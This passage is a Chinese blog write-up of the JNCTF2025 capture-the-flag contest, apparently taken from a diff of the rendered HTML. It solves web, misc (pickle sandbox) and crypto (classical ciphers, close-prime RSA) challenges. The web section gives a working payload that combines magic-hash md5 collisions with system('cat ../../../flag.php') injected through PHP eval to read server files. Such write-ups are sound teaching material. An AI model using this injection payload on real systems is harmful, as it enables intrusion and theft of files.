class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;???这都被你猜对了？？&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;但这好像只是第二关！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$d</span> !== <span class="hljs-variable">$e</span>) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$d</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$e</span>))) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;恭喜你！好像就马上要成功了！&quot;</span>;<br>        <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br>        <span class="hljs-comment">// flag在当前目录下的flag文件中</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo new Reflection(<span class="hljs-subst">$f</span>());&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第三部分可以用md5碰撞，然后给f赋值为system(‘ls -al’)一类的命令来看目录，找到flag后cat一下就好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">a=JNSEC=202cb962ac59075b964b07152d234b70&amp;c=123&amp;d=QNKCDZO&amp;e=240610708&amp;f=system(&#x27;cat%20../../../flag.php&#x27;)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p><del>唉，misc就是一坨</del></p>
+<h3 id="1-stego"><a href="#1-stego" class="headerlink" title="1. stego"></a>1. stego</h3><p>stego.qoi一个少见的图片格式，去网上找找github的qoi格式转换，把格式换回来就能看见flag</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/phoboslab/qoi">phoboslab&#x2F;qoi: The “Quite OK Image Format” for fast, lossless image compression</a></p>
+<h3 id="2-ez-pickle-jail"><a href="#2-ez-pickle-jail" class="headerlink" title="2.ez_pickle_jail"></a>2.ez_pickle_jail</h3><p>是一个python沙箱，可以利用低版本的pickle数据，这样在反序列后再转序列化就会导致内容不同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> binascii<br><br>pickle_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Enter the base64 encoded pickle: &quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    pickle_data = base64.b64decode(pickle_input)<br><span class="hljs-keyword">except</span> binascii.Error <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 encoding&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">try</span>:<br>    data = pickle.loads(pickle_data)<br><span class="hljs-keyword">except</span> pickle.UnpicklingError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid pickle data&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br>pickle_output = pickle.dumps(data)<br><span class="hljs-keyword">if</span> pickle_output != pickle_data:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read())<br><span class="hljs-comment"># too many solutions,isn&#x27;t it?</span><br><br><br><br>JNCTF&#123;hhhhTh1s_Re@1_E@sy_P7P1111&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br>data = <span class="hljs-number">0</span><br>pickle_data = pickle.dumps(data, protocol=<span class="hljs-number">0</span>)<br>encoded = base64.b64encode(pickle_data).decode()<br><span class="hljs-built_in">print</span>(encoded)<br></code></pre></td></tr></table></figure>
+
+<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="1-story"><a href="#1-story" class="headerlink" title="1.story"></a>1.story</h3><p>给了一大段换表后的文本，这里可以直接就让大语言模型帮忙完成统计爆破</p>
+<h3 id="2-悲伤的故事（有点像misc了）"><a href="#2-悲伤的故事（有点像misc了）" class="headerlink" title="2. 悲伤的故事（有点像misc了）"></a>2. 悲伤的故事（有点像misc了）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plant">这是一个悲伤的故事，他眼含泪水推开酒吧那扇厚重的门，脑中还不断回荡着酒吧里的各种乐器声，在酒精的麻痹下，他浑浑噩噩的走到了家中，看着小院栅栏中的鸟语花香，他又回想起曾经的那段时光，但他知道，他该放下了，就这样，他回到了自己的房间里，发现桌上有着一个古典雅致的盒子，他瞬间清醒了不少，激动的连忙赶过去，用钥匙打开，里面是封古典的信件，他双手颤抖着打开这封信：<br>亲爱的维吉！<br>三年了，你是否还记得“VERSd3FASFhjUkpyX19tMTFAQXsxMUdfX199”是什么意思，如果心中有那答案，就来找我吧。<br><br></code></pre></td></tr></table></figure>
+
+<p>在文本里能看出有栅栏加密（offset&#x3D;3），base64，维吉尼亚加密。</p>
+<p>base64之后：TDRwq@HXcRJr__m11@A{11G___}</p>
+<p>栅栏解密：TRADJ{Rr1w_1q_G@m_H1_X1_c@}</p>
+<p>根据JNCTF{}的flag格式，可以推断出密钥就是key</p>
+<p>最后维吉尼亚解密：JNCTF{Th1s_1s_W@i_J1_N1_y@}</p>
+<h3 id="3-熟悉的故人"><a href="#3-熟悉的故人" class="headerlink" title="3. 熟悉的故人"></a>3. 熟悉的故人</h3><p>源码：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import libnum<br>import gmpy2<br>import random<br>from secrets import FLAG<br><br>p = libnum.generate_prime(1024 + random.randint(0, 1024))<br>q = gmpy2.next_prime(p)<br>e = 65537<br>m = FLAG<br>m = libnum.s2n(m)<br>n = p*q<br>phi_n = (p-1)*(q-1)<br>d = libnum.invmod(e,phi_n)<br>c = pow(m,e,n)<br><br>print(<span class="hljs-string">&quot;n =&quot;</span>,n)<br>print (<span class="hljs-string">&quot;e =&quot;</span>,e)<br>print (<span class="hljs-string">&quot;c =&quot;</span>,c)<br><br><span class="hljs-comment"># n = 299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br><span class="hljs-comment"># e = 65537</span><br><span class="hljs-comment"># c = 173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br></code></pre></td></tr></table></figure>
+
+<p>RSA，直接脚本秒了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br><br>s = gmpy2.isqrt(n)<br>found = <span class="hljs-literal">False</span><br>p = <span class="hljs-literal">None</span><br>q = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    current = s - i<br>    <span class="hljs-keyword">if</span> n % current == <span class="hljs-number">0</span>:<br>        p = current<br>        q = n // current<br>        <span class="hljs-keyword">if</span> gmpy2.is_prime(p) <span class="hljs-keyword">and</span> gmpy2.is_prime(q) <span class="hljs-keyword">and</span> gmpy2.next_prime(p) == q:<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> found:<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = gmpy2.invert(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag.decode())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到合适的因数。&quot;</span>)<br><br><span class="hljs-comment"># JNCTF&#123;Is_just_another_RSA&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>没把ezbase打出来可惜了，re也没做出来多少</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>JNCTF2025WP</div>
+      <div>http://example.com/2025/03/24/1/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月24日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
